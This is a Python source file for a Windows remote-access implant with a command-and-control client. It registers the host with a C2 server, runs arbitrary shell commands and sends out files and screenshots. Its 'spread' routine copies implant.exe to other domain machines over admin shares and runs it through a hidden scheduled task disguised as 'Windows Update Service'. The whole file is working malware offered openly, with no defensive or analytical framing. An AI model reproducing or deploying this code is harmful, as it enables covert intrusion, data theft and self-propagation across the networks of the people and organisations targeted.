import os
import sys
import json
import time
import uuid
import socket
import platform
import getpass
import subprocess
import threading
import queue
import base64
import requests
import socketio
import psutil
from PIL import ImageGrab
from io import BytesIO
import win32com.client
import win32security
import win32net
import win32netcon
import win32api
import win32con
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('implant.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Implant:
    def __init__(self, c2_url, domain_user=None, domain_password=None):
        self.c2_url = c2_url
        self.domain_user = domain_user
        self.domain_password = domain_password
        self.implant_id = str(uuid.uuid4())
        
        # Configure socket.io client
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=5,
            logger=True,
            engineio_logger=True
        )
        
        # Set transport after initialization
        self.sio.transport = 'websocket'
        
        self.command_queue = queue.Queue()
        self.running = True
        self.connected = False
        
        # System information
        self.hostname = socket.gethostname()
        self.ip = socket.gethostbyname(self.hostname)
        self.os = platform.platform()
        self.user = getpass.getuser()
        
        # Setup socket.io event handlers
        self.setup_socket_handlers()
    
    def setup_socket_handlers(self):
        """Setup socket.io event handlers"""
        @self.sio.event
        def connect():
            logger.info("Connected to C2 server")
            self.connected = True
            self.register()
        
        @self.sio.event
        def disconnect():
            logger.info("Disconnected from C2 server")
            self.connected = False
            self.reconnect()
        
        @self.sio.on('registered')
        def on_registered(data):
            if data.get('status') == 'success':
                logger.info("Successfully registered with C2 server")
            else:
                error_msg = data.get('message', 'Unknown error')
                logger.error(f"Registration failed: {error_msg}")
                self.sio.disconnect()
        
        @self.sio.on('command')
        def on_command(data):
            try:
                command = data.get('command')
                implant_id = data.get('implant_id')
                timestamp = data.get('timestamp')
                
                logger.info(f"Received command event: {data}")
                
                if command and implant_id == self.implant_id:
                    logger.info(f"Processing command for this implant: {command}")
                    self.command_queue.put(command)
                else:
                    if implant_id != self.implant_id:
                        logger.warning(f"Ignoring command - implant_id mismatch. Expected: {self.implant_id}, Received: {implant_id}")
                    if not command:
                        logger.warning("Ignoring command - no command provided")
            except Exception as e:
                logger.error(f"Error processing command event: {e}")
    
    def register(self):
        """Register with the C2 server"""
        try:
            if not self.connected:
                logger.error("Not connected to C2 server")
                return
            
            registration_data = {
                'id': self.implant_id,
                'hostname': self.hostname,
                'ip': self.ip,
                'os': self.os,
                'user': self.user
            }
            logger.info(f"Registering with C2 server: {registration_data}")
            self.sio.emit('register', registration_data)
        except Exception as e:
            logger.error(f"Registration failed: {e}")
            self.sio.disconnect()
    
    def execute_command(self, command):
        """Execute a command and return the result"""
        try:
            logger.info(f"Processing command: {command}")
            
            if command.startswith('upload '):
                return self.handle_upload(command[7:])
            elif command.startswith('download '):
                return self.handle_download(command[9:])
            elif command == 'screenshot':
                return self.handle_screenshot()
            else:
                # Execute shell command
                logger.info(f"Executing shell command: {command}")
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
                
                try:
                    stdout, stderr = process.communicate(timeout=30)
                    logger.info(f"Command completed with return code: {process.returncode}")
                    
                    # Format command output
                    output = []
                    if stdout:
                        output.append("STDOUT:")
                        output.append(stdout)
                    if stderr:
                        output.append("STDERR:")
                        output.append(stderr)
                    
                    result = "\n".join(output) if output else "Command executed successfully (no output)"
                    logger.info(f"Command output length: {len(result)}")
                    return result
                    
                except subprocess.TimeoutExpired:
                    logger.warning(f"Command timed out: {command}")
                    process.kill()
                    return "Command timed out after 30 seconds"
                
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            logger.error(error_msg)
            return error_msg
    
    def handle_upload(self, filename):
        """Handle file upload to implant"""
        try:
            # Download file from C2 server
            response = requests.get(f"{self.c2_url}/uploads/{filename}")
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                return f"File {filename} uploaded successfully"
            return f"Failed to download file from C2 server: {response.status_code}"
        except Exception as e:
            return f"Upload failed: {e}"
    
    def handle_download(self, filename):
        """Handle file download from implant"""
        try:
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    file_data = f.read()
                # Upload file to C2 server
                files = {'file': (filename, file_data)}
                response = requests.post(
                    f"{self.c2_url}/api/implants/{self.implant_id}/upload",
                    files=files
                )
                if response.status_code == 200:
                    return f"File {filename} downloaded successfully"
                return f"Failed to upload file to C2 server: {response.status_code}"
            return f"File {filename} not found"
        except Exception as e:
            return f"Download failed: {e}"
    
    def handle_screenshot(self):
        """Take a screenshot and send it to the C2 server"""
        try:
            logger.info("Taking screenshot...")
            # Take screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to bytes with compression
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=85)
            img_byte_arr = img_byte_arr.getvalue()
            
            # Generate unique filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{self.hostname}_{timestamp}.png"
            
            logger.info(f"Uploading screenshot as {filename}")
            # Upload to C2 server
            files = {'file': (filename, img_byte_arr)}
            response = requests.post(
                f"{self.c2_url}/api/implants/{self.implant_id}/upload",
                files=files
            )
            
            if response.status_code == 200:
                logger.info("Screenshot uploaded successfully")
                return json.dumps({
                    'status': 'success',
                    'message': 'Screenshot captured and uploaded successfully',
                    'filename': filename
                })
            
            logger.error(f"Failed to upload screenshot: {response.status_code}")
            return json.dumps({
                'status': 'error',
                'message': f"Failed to upload screenshot: {response.status_code}"
            })
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")
            return json.dumps({
                'status': 'error',
                'message': f"Screenshot failed: {str(e)}"
            })
    
    def spread_to_domain(self):
        """Attempt to spread to other machines in the domain"""
        if not self.domain_user or not self.domain_password:
            return "Domain credentials not configured"
        
        try:
            # Get list of computers in domain
            computers = win32net.NetServerEnum(
                None, win32netcon.SV_TYPE_WORKSTATION | win32netcon.SV_TYPE_SERVER
            )[0]
            
            spread_results = []
            for computer in computers:
                if computer['name'].lower() != self.hostname.lower():
                    try:
                        # Copy implant to remote machine
                        remote_path = f"\\\\{computer['name']}\\C$\\Windows\\Temp\\implant.exe"
                        if os.path.exists("implant.exe"):
                            # Use WMI to copy file
                            wmi = win32com.client.GetObject("winmgmts:")
                            wmi.CopyFile("implant.exe", remote_path)
                            
                            # Create scheduled task to run implant
                            sch = win32com.client.Dispatch("Schedule.Service")
                            sch.Connect(computer['name'], self.domain_user, self.domain_password)
                            
                            task_def = sch.NewTask(0)
                            task_def.RegistrationInfo.Description = "Windows Update Service"
                            task_def.Settings.Enabled = True
                            task_def.Settings.Hidden = True
                            
                            # Create trigger (run once)
                            trigger = task_def.Triggers.Create(0)
                            trigger.StartBoundary = datetime.now().isoformat()
                            
                            # Create action (run implant)
                            action = task_def.Actions.Create(0)
                            action.Path = remote_path
                            
                            # Register task
                            sch.GetFolder("\\").RegisterTaskDefinition(
                                "WindowsUpdate",
                                task_def,
                                6,  # TASK_CREATE_OR_UPDATE
                                self.domain_user,
                                self.domain_password,
                                0
                            )
                            
                            spread_results.append(f"Successfully spread to {computer['name']}")
                    except Exception as e:
                        spread_results.append(f"Failed to spread to {computer['name']}: {e}")
            
            return "\n".join(spread_results)
        except Exception as e:
            return f"Domain spread failed: {e}"
    
    def command_worker(self):
        """Worker thread to process commands"""
        while self.running:
            try:
                command = self.command_queue.get(timeout=1)
                logger.info(f"Processing command from queue: {command}")
                
                try:
                    if command == "spread":
                        logger.info("Executing spread command")
                        result = self.spread_to_domain()
                    else:
                        logger.info(f"Executing command: {command}")
                        result = self.execute_command(command)
                    
                    # Ensure result is a string
                    if not isinstance(result, str):
                        result = str(result)
                    
                    # Log the result before sending
                    logger.info(f"Command result (length: {len(result)}): {result[:200]}...")
                    
                    # Send result back to C2 server
                    if self.connected:
                        result_data = {
                            'implant_id': self.implant_id,
                            'command': command,
                            'result': result,
                            'timestamp': datetime.now().isoformat()
                        }
                        logger.info(f"Sending command result to C2 server: {result_data}")
                        self.sio.emit('command_result', result_data)
                    else:
                        logger.error("Cannot send command result: Not connected to C2 server")
                except Exception as e:
                    error_msg = f"Error executing command {command}: {str(e)}"
                    logger.error(error_msg)
                    if self.connected:
                        self.sio.emit('command_result', {
                            'implant_id': self.implant_id,
                            'command': command,
                            'result': error_msg,
                            'timestamp': datetime.now().isoformat()
                        })
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Command worker error: {e}")
                time.sleep(1)  # Prevent tight loop on error

    def start(self):
        """Start the implant"""
        try:
            # Connect to C2 server with WebSocket transport
            logger.info(f"Connecting to C2 server at {self.c2_url} using WebSocket transport")
            self.sio.connect(
                self.c2_url,
                wait_timeout=10
            )
            
            # Start command worker thread
            worker_thread = threading.Thread(target=self.command_worker)
            worker_thread.daemon = True
            worker_thread.start()
            
            # Keep main thread alive and handle reconnection
            while self.running:
                if not self.connected and not self.sio.connected:
                    logger.info("Connection lost, attempting to reconnect...")
                    self.reconnect()
                time.sleep(1)
                
        except KeyboardInterrupt:
            logger.info("Shutting down implant...")
            self.running = False
            self.sio.disconnect()
        except Exception as e:
            logger.error(f"Implant error: {e}")
            self.running = False
            self.sio.disconnect()

    def reconnect(self):
        """Attempt to reconnect to the C2 server"""
        if not self.running:
            return
            
        logger.info("Attempting to reconnect using WebSocket transport...")
        try:
            if not self.sio.connected:
                self.sio.connect(
                    self.c2_url,
                    wait_timeout=10
                )
        except Exception as e:
            logger.error(f"Reconnection failed: {e}")
            time.sleep(5)
            if self.running:
                self.reconnect()

if __name__ == '__main__':
    # Get C2 server URL from command line or use default
    c2_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:5000'
    
    # Get domain credentials if provided
    domain_user = os.getenv('DOMAIN_USER')
    domain_password = os.getenv('DOMAIN_PASSWORD')
    
    # Create and start implant
    implant = Implant(c2_url, domain_user, domain_password)
    implant.start() 